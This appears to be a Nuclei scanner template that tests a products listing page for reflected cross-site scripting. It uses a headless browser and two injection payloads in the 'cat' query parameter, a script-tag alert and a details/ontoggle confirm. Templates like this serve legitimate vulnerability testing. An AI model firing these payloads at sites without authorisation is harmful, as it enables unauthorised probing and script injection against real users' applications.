headless:
- attack: pitchfork
  extractors:
  - dsl:
    - reflected_text_query_type
    - reflected_text_query_message
    type: dsl
  matchers:
  - dsl:
    - reflected_text_query == true
    type: dsl
  matchers-condition: and
  payloads:
    path:
    - /listproducts.php?cat=1
    - /listproducts.php?cat=1
    payload:
    - <%2Fscript><script>alert%283%2B4%29<%2Fscript>
    - '''>''><details/open/ontoggle=confirm(''XSS'')>'
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}{{path}}{{payload}}'
  - action: waitdialog
    args:
      max-duration: 10s
    name: reflected_text_query
id: headless-reflected-xss
info:
  author: yar0v1t
  description: 'A cross-site scripting (XSS) vulnerability with headless mode and
    pitchfork attack.

    '
  name: Reflected Headless XSS
  severity: high
